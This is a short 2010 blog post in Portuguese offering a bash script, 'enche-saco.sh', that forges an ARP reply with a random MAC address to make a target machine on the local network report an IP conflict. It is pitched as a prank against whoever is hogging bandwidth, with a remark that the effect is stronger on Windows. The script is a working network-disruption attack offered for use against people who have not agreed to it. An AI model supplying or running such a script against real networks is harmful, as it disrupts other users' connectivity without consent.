---
title: conflito de IPs
date: 2010-09-22T13:54:32+00:00
author: paolo
layout: post
permalink: /2010/09/22/conflito-de-ips/
categories:
  - pt-BR
tags:
  - hacks
  - not-really-useful
---
Sabe aquelas horas quando voce precisa fazer um download? quando alguem esta baixando porno no megaupload e voce precisa pegar aquele driver de 1MB ou quando voce so quer fazer gracinha mesmo? Para essas e outras ocasiões existe o enche-saco.sh (nome generico sem criatividade) cujo proposito é simular um conflito entre IPs na rede local, causando chateação na pessoa incoveniente que nao te deixa usar os recursos de rede ;D

<div id="_mcePaste">
  <pre class="brush: bash; title: ; notranslate" title="">
#!/bin/bash
echo [+] inicializando...
CHATOIP=$1
MEUMAC="`od -An -N10 -x /dev/random | md5sum | sed -r 's/^(.{12}).*$/\1/; s/([0-9a-f]{2})/\1:/g; s/:$//;'`"
CHATOMAC="`arping -fc 1 $CHATOIP 2&gt;/dev/null | grep "Unicast" | cut -d[ -f 2 | cut -d] -f 1`"
echo [+] sabotando $CHATOIP [ $CHATOMAC ]...
send_arp $CHATOIP $MEUMAC $CHATOIP $CHATOMAC
echo [+] feito.
</pre>
</div>

<pre><span style="font-family:Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height:19px;white-space:normal;font-size:13px;">Depois, um # ./enche-saco IP(como root, devido ao arp) enche o saco da pessoa incoveniente através de mensagens de conflito de IP. Isto tem um impacto significantemente maior contra o windows(e é mais divertido de ver tambem haha so fazer o teste xp).</span></pre>